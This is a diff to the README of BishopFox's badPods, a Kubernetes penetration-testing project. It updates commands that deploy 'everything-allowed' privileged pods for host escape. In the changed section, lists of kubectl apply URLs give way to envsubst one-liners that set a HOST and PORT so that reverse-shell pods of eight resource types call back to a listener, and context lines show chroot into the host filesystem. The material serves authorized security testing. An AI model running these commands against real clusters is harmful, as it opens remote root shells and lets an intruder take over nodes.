@@ -43,7 +43,7 @@ kubectl exec -it everything-allowed-exec-deployment-[ID] -- chroot /host bash
 ```
 **StatefulSet (This manifest also creates a service)**  
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/statefulset/everything-allowed-exec-statefulset.yaml
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/statefulset/everything-allowed-exec-statefulset.yaml
 kubectl get pods | grep everything-allowed-exec-statefulset
 kubectl exec -it everything-allowed-exec-statefulset-[ID] -- chroot /host bash
 ```
@@ -91,37 +91,17 @@ Connection received on 10.0.0.162 42035
 # chroot /host
 ```
 
-**Pod**  
+### All of the resource types for easy copy/paste: 
+
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-revshell-pod.yaml
-```
-**Job**  
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/job/everything-allowed-revshell-job.yaml 
-```
-**CronJob**  
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/cronjob/everything-allowed-revshell-cronjob.yaml 
-```
-**Deployment**  
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/deployment/everything-allowed-revshell-deployment.yaml 
-```
-**StatefulSet (This manifest also creates a service)**  
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/statefulset/everything-allowed-revshell-statefulset.yaml
-```
-**ReplicaSet**  
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/replicaset/everything-allowed-revshell-replicaset.yaml
-```
-**ReplicationController**  
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/replicationcontroller/everything-allowed-revshell-replicationcontroller.yaml
-```
-**DaemonSet**  
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/daemonset/everything-allowed-revshell-daemonset.yaml 
+HOST="10.0.0.1" PORT="3111" envsubst < ./manifests/everything-allowed/pod/everything-allowed-revshell-pod.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3112" envsubst < ./manifests/everything-allowed/job/everything-allowed-revshell-job.yaml | kubectl apply -f - 
+HOST="10.0.0.1" PORT="3113" envsubst < ./manifests/everything-allowed/cronjob/everything-allowed-revshell-cronjob.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3114" envsubst < ./manifests/everything-allowed/deployment/everything-allowed-revshell-deployment.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3115" envsubst < ./manifests/everything-allowed/statefulset/everything-allowed-revshell-statefulset.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/replicaset/everything-allowed-revshell-replicaset.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3117" envsubst < ./manifests/everything-allowed/replicationcontroller/everything-allowed-revshell-replicationcontroller.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3118" envsubst < ./manifests/everything-allowed/daemonset/everything-allowed-revshell-daemonset.yaml | kubectl apply -f - 
 ```
 
 ## Deleting resources
